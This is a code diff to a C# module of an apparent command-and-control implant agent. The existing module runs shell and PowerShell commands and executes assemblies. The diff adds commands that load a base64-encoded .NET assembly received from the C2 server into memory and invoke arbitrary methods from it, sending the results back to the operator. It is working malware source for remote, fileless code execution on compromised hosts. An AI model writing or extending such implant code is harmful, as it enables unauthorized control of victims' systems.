@@ -6,7 +6,6 @@ using Shared.Models;
 
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -18,6 +17,8 @@ namespace Agent.Modules
     {
         AgentController Agent;
         ConfigController Config;
+
+        Assembly CurrentAssembly;
 
         public void Init(AgentController Agent, ConfigController Config)
         {
@@ -56,6 +57,16 @@ namespace Agent.Modules
                     {
                         Name = "Assembly",
                         Delegate = ExecuteAssembly
+                    },
+                    new ModuleInfo.Command
+                    {
+                        Name = "ImportAssembly",
+                        Delegate = ImportAssembly
+                    },
+                    new ModuleInfo.Command
+                    {
+                        Name = "AssemblyMethod",
+                        Delegate = ExecuteAssemblyMethod
                     }
                 }
             };
@@ -73,7 +84,7 @@ namespace Agent.Modules
             }
         }
 
-        private void ExecuteRunCommand(string AgentID, C2Data C2Data)
+        void ExecuteRunCommand(string AgentID, C2Data C2Data)
         {
             try
             {
@@ -85,7 +96,7 @@ namespace Agent.Modules
             }
         }
 
-        private void ExecutePowerShellCommand(string AgentID, C2Data C2Data)
+        void ExecutePowerShellCommand(string AgentID, C2Data C2Data)
         {
             try
             {
@@ -97,7 +108,7 @@ namespace Agent.Modules
             }
         }
 
-        private void ExecutePowerPickCommand(string AgentID, C2Data C2Data)
+        void ExecutePowerPickCommand(string AgentID, C2Data C2Data)
         {
             try
             {
@@ -109,7 +120,7 @@ namespace Agent.Modules
             }
         }
 
-        private void ExecuteAssembly(string AgentID, C2Data C2Data)
+        void ExecuteAssembly(string AgentID, C2Data C2Data)
         {
             var stdout = Console.Out;
             var stderr = Console.Error;
@@ -157,6 +168,69 @@ namespace Agent.Modules
             {
                 Console.SetOut(stdout);
                 Console.SetError(stderr);
+            }
+        }
+
+        void ImportAssembly(string AgentID, C2Data C2Data)
+        {
+            try
+            {
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
+
+                CurrentAssembly = Assembly.Load(asmBytes);
+
+                Agent.SendMessage($"Assembly loaded: {CurrentAssembly.FullName}");
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
+            
+        }
+
+        void ExecuteAssemblyMethod(string AgentID, C2Data C2Data)
+        {
+            try
+            {
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+
+                var type = (string)parameters.FirstOrDefault(p => p.Name.Equals("Type", StringComparison.OrdinalIgnoreCase)).Value;
+                var method = (string)parameters.FirstOrDefault(p => p.Name.Equals("Method", StringComparison.OrdinalIgnoreCase)).Value;
+                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+
+                var t = CurrentAssembly.GetType(type);
+
+                if (t == null)
+                {
+                    Agent.SendError("Could not find specified type");
+                    return;
+                }
+
+                var m = t.GetMethod(method);
+
+                if (m == null)
+                {
+                    Agent.SendError("Could not find specified method");
+                    return;
+                }
+
+                string result;
+
+                if (arguments == null)
+                {
+                    result = (string)m.Invoke(null, new object[] { });
+                }
+                else
+                {
+                    result = (string)m.Invoke(null, new object[] { (string)arguments });
+                }
+
+                Agent.SendMessage(result.ToString());
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
             }
         }
     }
